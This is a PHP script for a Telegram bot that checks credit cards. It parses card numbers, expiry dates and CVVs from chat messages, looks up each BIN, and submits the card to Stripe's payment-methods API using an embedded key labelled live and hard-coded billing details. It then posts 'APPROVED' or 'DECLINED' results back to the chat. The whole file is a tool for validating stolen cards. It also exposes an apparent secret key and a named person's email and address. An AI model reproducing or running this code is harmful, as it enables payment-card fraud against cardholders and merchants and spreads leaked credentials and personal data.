<?php
include ('config.php');
$skeys = array(
    1 => 'pk_live_7eJoMVqqEZ85eX2E82EZy9yF001tORzSsV',
  ); 
  $skey = array_rand($skeys);
  $sk = $skeys[$skey];
$message = substr($message, 4);
$amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
$cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
$mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
$yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
$cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
if (empty($amt)) {
$amt = '1';
}
    $amount = $amt * 100;
    $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: lookup.binlist.net',
    'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '');
    $time = $info['total_time'];
    $httpCode = $info['http_code'];
    $time = substr($time, 0, 4);
    $fim = curl_exec($ch);
    $bank = GetStr($fim, '"bank":{"name":"', '"');
    $name = GetStr($fim, '"name":"', '"');
    $brand = GetStr($fim, '"brand":"', '"');
    $country = GetStr($fim, '"country":{"name":"', '"');
    $emoji = GetStr($fim, '"emoji":"', '"');
    $scheme = GetStr($fim, '"scheme":"', '"');
    $type = GetStr($fim, '"type":"', '"');
    if(strpos($fim, '"type":"credit"') !== false){
    $bin = 'Credit';
    }else{
    $bin = 'Debit';
    };
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&billing_details[name]=Corey Stowe&billing_details[email]=cstowe083@gmail.com&billing_details[address][country]=US&billing_details[address][line1]=2509 Mountainview Dr&billing_details[address][city]=Corint&billing_details[address][postal_code]=87210&billing_details[address][state]=Texas&payment_user_agent=stripe.js%2Fc8e99151a%3B+stripe-js-v3%2Fc8e99151a%3B+checkout');
    $result1 = curl_exec($ch);
    $tok1 = Getstr($result1,'"id": "','"');
    $msg1 = Getstr($result1,'"message": "','"');
    $msg1a = Getstr($result1,'"decline_code": "','"');
    if(strpos($result1, "payment_method" )) {
      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ✅</b>\n<b>Response -» Algorithm Card is vaild </b>\n<b>Gateway -» Stripe AGT v1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
       return;
    }
    if (strpos($result1, "card_declined" )) {
        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Check Algorithm card is falied </b>\n <b>Respone 2 -»  $msg1a</b>\n<b>Gateway -» Stripe AGT v1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
        return;
    }
    if (strpos($result1, "card_error" )) {
        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Check Algorithm card is falied </b>\n <b>Respone 2 -»  $msg1a</b>\n<b>Gateway -» Stripe AGT v1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
        return;

    }
    else {
        sendMessage($chatId, "<b>SERVER ERROR</b>\n<b>Response -» <code>$msg1 | $msg1a | $result1 </code></b>", $message_id);
    }      
?>